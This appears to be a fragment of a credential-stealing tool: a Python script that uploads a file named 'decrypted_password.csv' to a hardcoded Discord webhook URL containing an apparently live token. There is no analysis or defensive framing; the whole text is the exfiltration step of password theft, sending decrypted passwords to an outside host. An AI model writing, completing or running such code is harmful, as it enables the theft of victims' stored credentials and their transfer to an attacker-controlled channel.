from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1309056017325101078/GiBQU99oAA3nXhAXPXf89w3KiBk9SKeSmsy7b6_D1WViq85pyVQBO0UdItPtE469rmac")

with open("decrypted_password.csv", "rb") as f:
    webhook.add_file(file=f.read(), filename="decrypted_password.csv")

response = webhook.execute()
